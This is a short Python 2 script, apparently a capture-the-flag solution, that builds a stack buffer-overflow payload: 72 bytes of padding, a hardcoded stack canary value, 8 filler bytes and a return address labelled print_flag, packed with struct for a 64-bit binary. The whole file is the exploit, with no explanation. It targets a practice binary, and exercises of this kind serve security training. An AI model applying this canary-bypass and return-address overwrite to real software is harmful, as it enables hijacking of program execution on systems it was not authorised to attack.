import struct

cokkie = 0x1337133713371337

print_flag = 0x40062d

print ('A' * 72) + struct.pack('<Q', cokkie) + ('A' * 8) + struct.pack('<Q', print_flag) 
